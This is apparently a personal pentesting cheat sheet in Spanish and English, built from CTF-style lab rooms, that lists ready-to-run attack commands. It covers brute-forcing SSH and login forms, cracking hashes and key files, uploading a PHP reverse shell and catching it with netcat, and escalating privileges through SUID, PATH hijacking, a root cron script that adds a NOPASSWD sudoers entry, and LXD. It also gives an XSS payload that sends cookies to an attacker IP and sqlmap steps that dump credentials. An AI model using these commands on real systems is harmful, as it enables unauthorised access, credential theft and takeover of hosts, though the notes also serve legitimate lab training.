
# cheetsheat-cyber
Este sitio pretende recopilar mis notas acerca de cuestiones relevantes para realizar un pentesting.  No pretende ser un documento academico publico, unicamente personal.

#### ESCANEO NMAP

`sudo nmap -sS -sV -sC -n -Pn <IP_ADDRESS>`   --> Escaneo fuerza bruta

`sudo nmap -sV -vv --script vuln TARGET_IP` --> Escaneo de vulnerabilidades

`-A`	OS version detection
`-p<x>` or `-p-`	Port Scan or Scan all ports
`-sC`	Scan with default script of nmap
`-v`	Verbose
`-sV` Scan the host using TCP and perform version fingerprinting
`-O` Scan the host to retrieve and perform OS detection

---
#### Conexion a un samba

`smbclient //<ip_address>/anonymous`

---
#### GOBUSTER - Enumeracion de directorios

`gobuster dir -u http://<ip>:3333 -w /usr/share/wordlists/dirb/common.txt`

- Buscar por extensiones (txt)

`gobuster dir -u http://10.10.10.0 -w /usr/share/wordlists/dirb/common.txt -x txt`

---
#### WFUZZ - Fuzzing de directorios

`wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ`

`-c` Show the output in color
`-z` Specifies what will replace FUZZ in the request. *For example -z file,big.txt*

---
#### Encontrar archivos con SUID

`find / -type f -perm -u=s 2> /dev/null`

`find / -user root -perm -4000 -exec ls -ldb {} \;`

- Escalar privilegios con un binario

`-rwSrWxr-x 1 root root 8880 Dec  7  2019 /usr/bin/system-control`

---
#### Para poder ver que podria enumerar informacion del servidor

`enum4linux -a <IP_ADDRESS>`

---
#### Ataque de fuerza bruta
- SSH

`hydra -t 4 -l <USER> -P /usr/share/wordlist/rockyou.txt <IP_ADDRESS> ssh`

`ncrack -p 22 --user <USER> -P /usr/share/wordlist/rockyou.txt <IP_ADDRESS>`

`medusa -u <USER> -P /usr/share/wordlist/rockyou.txt -h <IP_ADDRESS> -M 22`

- POST-FORM

`hydra -l <username> -P <wordlist> 10.10.154.12 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

`hydra -l <username> -P <path-to-short-rockyou> <remote-ip> http-post-form "/login:username=^USER^&password=^PASS^&Login=Login:Your username or password is incorrect." -V`

---
#### Crackear con John The Ripper

--- *Rippear HASH RSA Private KEY) id_rsa*
`/usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash`

-- *Si tengo un diccionario:* 
`john --wordlist=dict.txt id_rsa.hash
sudo john id_rsa.hash`

--- *Rippear GPG con John*
`sudo gpg2john note1.txt.gpg > hash`
`sudo john hash`

--- *Crackear Zip con John*
`zip2john secret.zip > secret.hash`
`john --wordlist=/usr/share/wordlists/rockyou.txt secret.hash`

--- **Romper clave de fichero ZIP**
`fcrackzip -vbDp <path-to-rockyou.txt> <filename>`

---
#### HASHCAT  

- Sacar contraseña donde sabemos que esta en MD5
`hashcat -m 0 hash-robot.txt /usr/share/wordlists/rockyou.txt`

- Cuando es SHA-512Crypt
`hashcat -m 1800 charlie.hash /usr/share/wordlists/rockyou.txt`

---
#### STEGSEEK

- https://github.com/RickdeJager/stegseek
---
#### HASHID  - Identificar tipo de hash

`hashid charlie.hash`

---
### Reverse PHP shell 
To gain remote access to this machine, follow:

1. Edit the php-reverse-shell.php file and edit the ip to be your `tun0 ip`.

2. Rename this file to *`php-reverse-shell.phtml`*

3. We're now going to listen to incoming connections using `netcat`. Run the following command: `nc -lvnp 1234`

4. Upload your shell and execute your payload

5. You should see a connection on your `netcat` session

6. To have a more functional shell
- In the reverse shell
`python3 -c 'import pty;pty.spawn("/bin/bash")'`
`Ctrl+Z`

- In our machine
`stty raw -echo`
`fg`

- Push Intro and We stay again in reverse shell
`export TERM=xtermsudo` or `export TERM=xterm`

---
### Manipular un binario para escalar privilegios
--- Systemctl vulnerable (https://gtfobins.github.io/gtfobins/systemctl/)

`sudo sh -c 'cp $(which systemctl) .; chmod +s ./systemctl'`

`TF=$(mktemp).service`
`echo '[Service]`
`Type=oneshot`
`ExecStart=/bin/sh -c "id > /tmp/output"`
`[Install]`
`WantedBy=multi-user.target' > $TF`
`./systemctl link $TF`
`./systemctl enable --now $TF`


--- Cuando un binario esta corriendo sin un path absoluto, podemos modificarlo
`echo /bin/sh >curl`
`chmod 777 curl`
`export PATH=/tmp:$PATH`
`/usr/bin/menu`

``` console
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1

id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm)
```
> *We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!*

---
### Escalacion de privilegios con crontab

--- Si encontramos que hay un script o cron que se ejecuta con permisos de root, podemos editarlo para hacernos como root (por ejemplo)

```console
root@ip-10-10-106-27:/home/scripts# ll
total 16
drwxrwxrwx 2 root   root   4096 Jul 31 22:12 ./
drwxr-xr-x 5 root   root   4096 Dec 19  2019 ../
-rwxrwxrwx 1 ubuntu ubuntu   64 Jul 31 22:12 clean_up.sh*
-rw-r--r-- 1 root   root      5 Dec 19  2019 test.txt

root@ip-10-10-106-27:/home/scripts# cat clean_up.sh 
rm -rf /tmp/*
echo "sam ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```

---
### METASPLOIT

--- Abrir consola metasploit
`sudo msfconsole`

--- Usar exploit
`use post/multi/manage/shell_to_meterpreter`

--- Exploit que abre una shell
`use post/multi/manage/shell_to_meterpreter`

--- Ver sesiones de shell 
`sessions -l`

--- Establecer una sesion interactiva
`sessions -i 2`

---
### VOLATILITY

--- Saber en que SO esta la imagen de la captura de la ram
`volatility -f <imagen> imageinfo`

--- Cuando sabemos el perfil
`volatility -f <imagen> --profile=<perfil_detectado> imageinfo`

--- Listar procesos
`volatility -f <imagen> --profile=<perfil_detectado> pstree`

--- Extraer proceso con memdump
`volatility -f <imagen> --profile=<perfil_detectado> memdump -p <PID> -D <Directorio-dumpeo>`

---
### Abrir fichero encriptacion asimetrica
`sudo openssl rsautl -decrypt -inkey <private.key> -in <note_encrypted.txt> -out <note_decrypted.txt>`

---
### Ataque XSS (un ejemplo)
`</p><script>window.location = 'http://<your-tun0-ip>/page?param=' + document.cookie; </script><p>`


---
###  SQLMAP 
--- Interceptar trafico con BurpSuite y guardar item como request.txt

--- Realizar analisis de vulnerabilidad con SQLMap
`sqlmap -r path/to/request.txt --dbs`
`sqlmap -r <path-to-request> --current-db`

--- Enumerar la BBDD
`sqlmap -r request.txt -D social --tables --batch`

--- Enumerar las tablas
`sqlmap -r <path-to-request> -D social --tables`

--- Enumerar columnas
`sqlmap -r <path-to-request> -D acuart -T artists --columns`

--- Enumerar usuarios y contraseñas
`sqlmap -r <path-to-request> -D social -T users -C username,email,password --dump`

---
### Escalar privilegios - varios opciones
https://tryhackme.com/room/linuxprivesc

--- **Privilege Escalation with LXD: (https://www.hackingarticles.in/lxd-privilege-escalation/)**

Among the more curious privilege escalation methods on Linux, lxd is certainly a mind-bender, to say the least. This technique involves leveraging a flaw in lxd, a program that we can use to spin up containers much akin to Docker. This exploit specifically involves abusing mount points to mount volumes from our victim machine (the machine we're attacking) within a container that we shouldn't be able to access/read. However, we have root powers on lxd containers - thus allowing us to bypass the read permission checks and escalate our privileges. We can perform this privesc method via the following steps:

1. First, we need to check and see if our user is a member of the lxd group. We can do this with the command: id

We can see in this case that the user is a member of the lxd group. Note, images from this section are from the source linked at the end with regards to additional information. 


2. Typically, this privesc can be a bit of a drawn-out process, however, in our case, we'll be able to skip part of the way through. To perform it properly, we have to perform the following steps.:

-- Steps to be performed on the attacking machine:

* Download build-alpine on your local machine via the git repository
*Execute the script "build -alpine" that will build the latest Alpine image as a compressed file. This must be executed by the root user.
*Transfer this newly created tar file to the victim machine


--- Steps to be performed on the victim machine:

* Download the alpine image
* Import image for lxd
* Initialize the image inside a new container <- Worth checking the already imported/available images as you may be able to skip to this step
*  Mount the container inside the /root directory


4. Now for the fun bit. Next, we'll run a series of commands which initialize, configure the disks, and start the container. Image name needs to match up with the imported image we'll be using. In the case of the image above, that'd be the myimage alias previously assigned to it. The container name and device name are whatever your heart desires. In my example, I'm naming my container strongbad and the device trogdor.


`lxc init IMAGENAME CONTAINERNAME -c security.privileged=true`

*Example: `lxc init myimage strongbad -c security.privileged=true`*


`lxc config device add CONTAINERNAME DEVICENAME disk source=/ path=/mnt/root recursive=true`

*Example: `lxc config device add strongbad trogdor disk source=/ path=/mnt/root recursive=true`*


`lxc start CONTAINERNAME`

*Example: `lxc start strongbad`*


`lxc exec CONTAINERNAME /bin/sh`

*Example: `lxc exec strongbad /bin/sh`*


We'll then run just a few more commands to mount our storage and verify we've escalated to root:

```console
id

cd /mnt/root/root
```

And that's it! If that was a bit of a mind-bender, I highly recommend checking out the resource provided below. 

---
### RADARE2

-- Lanzamos comando:
`r2 -d <binario_analizar>`

--- Lanzamos analisis
`[0x7f8db742a090]> aaa`

-- Lanzamos analisis de funciones
`[0x7f8db742a090]> afl`

-- Llamamos al main
`[0x7f8db742a090]> pdf @main`

-- Buscamos donde se nos pide lo que buscamos y apuntamos a esta seccion de la memoria.
`[0x7f2da5a66090]> db 0x0040082c`

-- Lanzamos el programa para llenar la variable.
`[0x7f8db742a090]> dc`

-- Retornamos el valor de la variable que buscamos o que estamos llenando
`[0x0040082c]> px @rdi`

`[0x0040082c]> px @rsi`

---
### BUSQUEDAS EN LINUX

--- Buscar palabras en ficheros
`grep -l -e "password" -f *`

--- Buscar una IP entre los ficheros
`cat * | grep -Eo "([0-9]{1,3}[\.]){3}[0-9]{1,3}"`

---
### NOS PUEDE AYUDAR A RECUPERAR LLAVES RSA

https://www.mobilefish.com/services/big_number/big_number.php    - Calcular numeros grandes

https://blog.cryptohack.org/twitter-secrets - Tenemos una key privada rota

https://github.com/ch4m17ux/rsatool/blob/master/rsatool.py - recuperar llave privada teniendo p y q

https://medium.com/@apogiatzis/tokyowestern-ctf-2018-revolutional-secure-angou-write-up-d5aa2b73ae8c - tenemos llave publica y calculamos para poder obtener la key privada
